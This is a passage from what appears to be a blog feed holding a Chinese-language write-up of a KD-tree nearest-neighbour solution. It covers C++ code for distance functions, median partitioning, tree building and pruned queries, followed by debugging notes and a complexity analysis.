function">Dist</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Node y<span class="token punctuation">)</span><span class="token punctuation">{</span>    ll dis <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dis <span class="token operator">+=</span> <span class="token number">1ll</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dis<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先为两个向量定义其 $Euclid$ 距离.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 44</span>ll <span class="token function">Dist</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Tree y<span class="token punctuation">)</span><span class="token punctuation">{</span>    ll dis <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> dist<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> y<span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dis <span class="token operator">+=</span> <span class="token number">1ll</span> <span class="token operator">*</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dis<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再为一个点与一个区域定义其最短 $Euclid$ 距离. 逐次比较该点第 $i$ 维的坐标与区域在第 $i$ 维的坐标范围, 并取最短距离. 将每个维度的距离综合即得到了该点到此区域的最短 $Euclid$ 距离.</p><h4 id="中位排序"><a href="#中位排序" class="headerlink" title="中位排序"></a>中位排序</h4><p>我们定义一个中位排序操作, 它将序列的中位数放置到正确的位置, 同时满足前半段的元素均小于中位元素, 后半段的元素均大于中位元素.</p><p>该算法具体实现参考自<a href="https://zhuanlan.zhihu.com/p/145456043">此教程</a>, 是一种期望为线性时间的选择算法, 时间复杂度在平均情况下为 $O(n)$.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 58</span><span class="token keyword">void</span> <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Node tmp <span class="token operator">=</span> node<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">Partion</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> node<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">Swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            k<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token function">Swap</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> k<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">FindMedium</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token function">Partion</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> mid<span class="token punctuation">)</span> <span class="token keyword">return</span> k<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">&gt;</span> mid<span class="token punctuation">)</span> r <span class="token operator">=</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> l <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次 <code>Partion()</code> 操作的执行都能确定一个元素的正确位置 (若该元素为第 $k$ 大, 那么其一定处于第 $k$ 位), 同时其左的元素均小于该元素, 其右的元素均大于该元素. 如果 <code>Partion</code> 返回的位置恰为序列的中位, 那么中位排序已完成; 否则递归对剩余元素进行中位排序即可.</p><h4 id="建树"><a href="#建树" class="headerlink" title="建树"></a>建树</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 104</span><span class="token keyword">void</span> <span class="token function">Build</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    comp <span class="token operator">=</span> direction<span class="token punctuation">;</span>    <span class="token function">FindMedium</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token function">Build</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>direction <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> dimension<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>rightnode <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token function">Build</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token punctuation">(</span>direction <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> dimension<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PushUp</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中全局变量 <code>int comp</code> 的取值范围为 $[0, dimension - 1]$, 它记录了当前建树时从哪个维度的坐标对当前向量进行排序.</p><p>一个 <code>tree[k]</code> 节点可能会对应多个 <code>Node</code> 向量, 我们调用 <code>FindMedium(l, r)</code> 对这些向量排序, 将按第 <code>comp</code> 维度的坐标排序后的中位向量放置在 <code>Node node[N]</code> 中位 <code>node[mid]</code> 上, 同时满足在其之前的向量的第 <code>comp</code> 维度坐标均小于 <code>node[mid]</code> , 在其之后的向量的第 <code>comp</code> 维度坐标均大于 <code>node[mid]</code>.</p><p>随后将 <code>node[mid]</code> 记录在 <code>tree[k]</code> 中, 并递归建立其左右子树, 在 <code>tree[k]</code> 内使用 <code>bool leftnode</code> 与 <code>bool rightnode</code> 记录, 最后调用 <code>PushUp(k)</code> 自底向顶更新每个 <code>tree[k]</code> 内的节点集所覆盖的区域的端点.</p><h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><p>对于叶节点, 我们在 <code>Build()</code> 中将其覆盖的区域端点设置为该点本身:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 107</span><span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 叶节点</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于含有子节点的父节点 <code>tree[k]</code>, 根据我们建树的方式, 其右子节点 <code>tree[right]</code> 必然存在. 首先在右子节点 <code>tree[right]</code> 的覆盖区域内加入点 <code>tree[k].p</code>; 若左子节点 <code>tree[left]</code> 存在, 再使用其覆盖区域更新 <code>tree[k]</code> 的覆盖区域.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 89</span><span class="token keyword">void</span> <span class="token function">PushUp</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dimension<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tree<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">.</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 134</span><span class="token keyword">void</span> <span class="token function">Query</span><span class="token punctuation">(</span>Node p<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ANS <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>ANS<span class="token punctuation">,</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>is_leaf<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>leftnode <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ll left_min <span class="token operator">=</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ll right_min <span class="token operator">=</span> <span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left_min <span class="token operator">&lt;</span> right_min<span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">else</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Dist</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> ANS<span class="token punctuation">)</span>            <span class="token function">Query</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出点 <code>Node p</code> 与子树 <code>tree[k]</code>, 我们给出 <code>p</code> 到 <code>tree[k]</code> 中的点的最短距离. 其中 <code>ANS</code> 是一个记录当前查询到的最短距离的全局变量, 在每次总查询前, 我们将其复位为 <code>INF = 1e16</code>.</p><p>首先使用 <code>tree[k]</code> 内记录的点与 <code>p</code> 的距离更新最短距离 <code>ANS</code>; 若左子节点不存在, 特判 <code>p</code> 到 <code>tree[right]</code> 区域的最小值, 当小于 <code>ANS</code> 时执行向下递归查询; 若左子节点存在, 那么同时计算 <code>p</code> 到 <code>tree[left]</code> 区域的最小值, 并首先递归查询距离较短的子树.</p><h4 id="输入与查询"><a href="#输入与查询" class="headerlink" title="输入与查询"></a>输入与查询</h4><p>封装为 <code>Init()</code> 与 <code>Work()</code> 函数.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>起初出现了 <code>Runtime Error(trap 14)</code> 的报错, 在对 <code>Tree[]</code> 进行扩容后消除, 这是因为对 $n$ 个点建立 <code>KD-Tree</code> 需要不止 $n$ 个 <code>Tree</code> 节点来存储.</li><li>使用全局变量 <code>comp</code> 记录当前建树所选取坐标轴的维度, 并在向下递归过程中将其 <code>+ 1</code>.</li><li>首次实现时, 我将所有向量都保存叶节点内, 这样做会导致第 $13$ 个点开始出现 <code>Time Limit Exceeded</code>. 再次实现时, 我在每个内部节点也保存了一个向量值, 并在 <code>Query()</code> 过程向左右子树递归时, 首先访问距离较短的那一个, 起到了剪枝优化的效果.</li><li>对于 <code>FindMedium()</code> 的实现参考了 <a href="https://zhuanlan.zhihu.com/p/145456043">此教程</a>.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><code>Init()</code> 过程读入输入数据的时间复杂度为 $O(nd)$, 建树过程中每一步时间消耗主要源自 <code>FindMedium(l, r)</code>, 这是 $O(n)$ 复杂度的, 逐层建树的时间复杂度为 $O(nlogn)$.</p><p>每次进行 <code>Query()</code> 都进行了剪枝操作, 优化了访问不可能包含答案点的区域的情形. 考虑最坏情况下查询的时间复杂度, 与遍历一棵 $d$ 维 $KD-Tree$ 是等价的, 时间复杂度为 $O(n^{1 - 1/d})$. 进行 $m$ 次查询的时间复杂度为 $O(mn^{1 - 1/d})$.</p><p>综上, 算法总时间复杂度为 $O(nlogn + mn^{1 - 1/d})$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>算法空间复杂度主要来自读取并存储数据的过程:</p><p>每个 <code>Node</code> 结构体实例占用的空间为: $5\times 4B = 20B$.</p><p>每个 <code>Tree</code> 结构体实例占用的空间为: $10\times 4B + 20B + 4B = 64B$.</p><p>实际占用的 <code>Node</code>, <code>Tree</code> 结构体数目正比于输入数据的规模, 空间复杂度为 $O(nd)$.</p><p>最坏情况下程序所占用的内存约为: $20B\times 10^5 + 64B\times 4\times 10^5 = 26.3MB \ll 256MB$.</p><p>因此空间复杂度满足要求.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Build</title>
      <link href="/2022/11/21/shu-ju-jie-gou-build/"/>
      <url>/2022/11/21/shu-ju-jie-gou-build/</url>
      
